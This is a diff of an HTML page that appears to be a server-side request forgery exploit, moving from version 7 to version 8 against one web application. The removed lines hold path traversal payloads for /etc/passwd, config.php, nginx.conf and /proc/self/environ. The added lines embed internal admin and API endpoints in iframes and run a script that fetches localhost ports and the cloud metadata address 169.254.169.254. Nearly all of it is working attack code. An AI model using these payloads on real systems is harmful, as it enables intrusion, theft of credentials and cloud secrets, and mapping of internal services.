@@ -1,108 +1,105 @@
 <!DOCTYPE html>
-<html>
-<head><title>R</title>
+<html><head><title>R</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{font:7px/1.1 monospace;margin:2px}
+body{font:6px/1.05 monospace;margin:1px}
 .s{border:1px solid #000;margin:1px 0}
-h3{font-size:8px;background:#ccc;padding:1px 2px}
+h3{font-size:7px;background:#ccc;padding:0 2px}
 iframe{width:100%;border:0}
-pre{white-space:pre-wrap;font-size:6px;background:#f5f5f5;padding:1px;word-break:break-all}
+pre{white-space:pre-wrap;font-size:5.5px;background:#f5f5f5;padding:1px;word-break:break-all}
 </style>
 </head>
 <body>
-<b>SSRF v7 - Deep Path Traversal</b>
+<b>SSRF v8 - Flussonic + Internal deep</b>
 
-<!-- Double URL-encoded traversal with increasing depth -->
-<div class="s">
-<h3>T1: 4x ..%252f etc%252fpasswd</h3>
-<iframe style="height:50px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=..%252f..%252f..%252f..%252fetc%252fpasswd&node=3"></iframe>
-</div>
+<!-- Flussonic admin panel - LARGE to capture SPA render -->
+<div class="s"><h3>Flussonic /admin/</h3>
+<iframe style="height:400px" src="https://127.0.0.1/flussonic/admin/"></iframe></div>
 
-<div class="s">
-<h3>T2: 5x ..%252f etc%252fpasswd</h3>
-<iframe style="height:50px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=..%252f..%252f..%252f..%252f..%252fetc%252fpasswd&node=3"></iframe>
-</div>
+<!-- Flussonic API versions -->
+<div class="s"><h3>Flussonic /api/v3/streams</h3>
+<iframe style="height:100px" src="https://127.0.0.1/flussonic/api/v3/streams"></iframe></div>
 
-<div class="s">
-<h3>T3: 6x ..%252f etc%252fpasswd</h3>
-<iframe style="height:50px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd&node=3"></iframe>
-</div>
+<div class="s"><h3>Flussonic /api/v2/media</h3>
+<iframe style="height:80px" src="https://127.0.0.1/flussonic/api/v2/media"></iframe></div>
 
-<div class="s">
-<h3>T4: 7x ..%252f etc%252fpasswd</h3>
-<iframe style="height:50px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd&node=3"></iframe>
-</div>
+<div class="s"><h3>Flussonic /api/server</h3>
+<iframe style="height:80px" src="https://127.0.0.1/flussonic/api/server"></iframe></div>
 
-<div class="s">
-<h3>T5: 8x ..%252f etc%252fpasswd</h3>
-<iframe style="height:50px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd&node=3"></iframe>
-</div>
+<div class="s"><h3>Flussonic /flussonic/ root</h3>
+<iframe style="height:80px" src="https://127.0.0.1/flussonic/"></iframe></div>
 
-<div class="s">
-<h3>T6: 10x ..%252f etc%252fpasswd</h3>
-<iframe style="height:50px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd&node=3"></iframe>
-</div>
+<!-- Login page (known to render) - detailed view -->
+<div class="s"><h3>/ (root login)</h3>
+<iframe style="height:300px" src="https://127.0.0.1/"></iframe></div>
 
-<!-- Overlong UTF-8 variants -->
-<div class="s">
-<h3>T7: 5x ..%c0%af etc/passwd</h3>
-<iframe style="height:50px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd&node=3"></iframe>
-</div>
+<!-- Key PHP endpoints with node=3 -->
+<div class="s"><h3>/ax/reports.php?node=3</h3>
+<iframe style="height:120px" src="https://127.0.0.1/ax/reports.php?node=3"></iframe></div>
 
-<div class="s">
-<h3>T8: 7x ..%c0%af etc/passwd</h3>
-<iframe style="height:50px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd&node=3"></iframe>
-</div>
+<div class="s"><h3>/backend/ax/init.php</h3>
+<iframe style="height:120px" src="https://127.0.0.1/backend/ax/init.php"></iframe></div>
 
-<!-- Try known relative paths to locate base directory -->
-<div class="s">
-<h3>T9: ..%252fconfig.php (1 up)</h3>
-<iframe style="height:50px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=..%252fconfig.php&node=3"></iframe>
-</div>
+<div class="s"><h3>/ax/init.php</h3>
+<iframe style="height:80px" src="https://127.0.0.1/ax/init.php"></iframe></div>
 
-<div class="s">
-<h3>T10: ..%252f..%252fconfig.php (2 up)</h3>
-<iframe style="height:50px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=..%252f..%252fconfig.php&node=3"></iframe>
-</div>
+<div class="s"><h3>/backend/ax/session.php</h3>
+<iframe style="height:80px" src="https://127.0.0.1/backend/ax/session.php"></iframe></div>
 
-<div class="s">
-<h3>T11: ..%252f..%252f..%252fconfig.php (3 up)</h3>
-<iframe style="height:50px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=..%252f..%252f..%252fconfig.php&node=3"></iframe>
-</div>
+<div class="s"><h3>/backend/ax/current_data.php?node=3</h3>
+<iframe style="height:80px" src="https://127.0.0.1/backend/ax/current_data.php?node=3"></iframe></div>
 
-<!-- Try reading a known PDF to find base dir -->
-<div class="s">
-<h3>T12: ..%252f..%252foffline_reports%252f29b6426f357c8c880862972b9ed8be08_c.pdf</h3>
-<iframe style="height:50px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=..%252f..%252foffline_reports%252f29b6426f357c8c880862972b9ed8be08_c.pdf&node=3"></iframe>
-</div>
+<div class="s"><h3>/backend/ax/get_gpx_file.php?track_id=1&amp;node=3</h3>
+<iframe style="height:100px" src="https://127.0.0.1/backend/ax/get_gpx_file.php?track_id=1&node=3"></iframe></div>
 
-<!-- Try nginx/proc files -->
-<div class="s">
-<h3>T13: 5x etc%252fnginx%252fnginx.conf</h3>
-<iframe style="height:80px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=..%252f..%252f..%252f..%252f..%252fetc%252fnginx%252fnginx.conf&node=3"></iframe>
-</div>
+<div class="s"><h3>/backend/ax/export.php?node=3</h3>
+<iframe style="height:60px" src="https://127.0.0.1/backend/ax/export.php?node=3"></iframe></div>
 
-<div class="s">
-<h3>T14: 7x etc%252fnginx%252fnginx.conf</h3>
-<iframe style="height:80px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fnginx%252fnginx.conf&node=3"></iframe>
-</div>
+<!-- HTTP fetch results for port 8080 -->
+<div class="s"><h3>PORT 8080 + FLUSSONIC FETCH</h3>
+<pre id="r">scanning...</pre></div>
 
-<div class="s">
-<h3>T15: 5x proc%252fversion</h3>
-<iframe style="height:50px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=..%252f..%252f..%252f..%252f..%252fproc%252fversion&node=3"></iframe>
-</div>
+<script>
+var o='';
+function p(s){o+=s+'\n';document.getElementById('r').textContent=o}
 
-<div class="s">
-<h3>T16: 5x proc%252fself%252fenviron</h3>
-<iframe style="height:80px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=..%252f..%252f..%252f..%252f..%252fproc%252fself%252fenviron&node=3"></iframe>
-</div>
+async function tf(l,u){
+try{var r=await fetch(u);var t=await r.text();p(l+' ['+r.status+']: '+t.substring(0,200))}
+catch(e){p(l+' ERR: '+e.message)}
+}
 
-<!-- init.php large frame -->
-<div class="s">
-<h3>INIT.PHP (localhost full response)</h3>
-<iframe style="height:500px" src="https://127.0.0.1/backend/ax/init.php"></iframe>
-</div>
+(async function(){
+// Port 8080 - Flussonic typical ports
+await tf('8080:/','http://127.0.0.1:8080/');
+await tf('8080:flus','http://127.0.0.1:8080/flussonic/');
+await tf('8080:fl-api','http://127.0.0.1:8080/flussonic/api/server');
+await tf('8080:fl-str','http://127.0.0.1:8080/flussonic/api/streams');
+await tf('8080:fl-v3','http://127.0.0.1:8080/flussonic/api/v3/streams');
+await tf('8080:fl-cfg','http://127.0.0.1:8080/flussonic/api/read_config');
+await tf('8080:fl-adm','http://127.0.0.1:8080/flussonic/admin/');
 
-</body>
-</html>
+// Port 80 Flussonic
+await tf('80:fl','http://127.0.0.1:80/flussonic/');
+await tf('80:fl-api','http://127.0.0.1:80/flussonic/api/server');
+
+// Try Flussonic default port 8080 with various API paths
+await tf('8080:media','http://127.0.0.1:8080/media');
+await tf('8080:cam','http://127.0.0.1:8080/cam1');
+await tf('8080:live','http://127.0.0.1:8080/live');
+await tf('8080:play','http://127.0.0.1:8080/play');
+await tf('8080:dash','http://127.0.0.1:8080/dashboard');
+await tf('8080:rbt','http://127.0.0.1:8080/robots.txt');
+await tf('8080:stat','http://127.0.0.1:8080/stat');
+
+// AWS metadata (one more try)
+await tf('AWS','http://169.254.169.254/latest/meta-data/');
+
+p('DONE');
+})();
+
+// Redirect to Flussonic admin after 40s for full page capture
+setTimeout(function(){
+  window.location.href = 'https://127.0.0.1/flussonic/admin/';
+}, 40000);
+</script>
+</body></html>
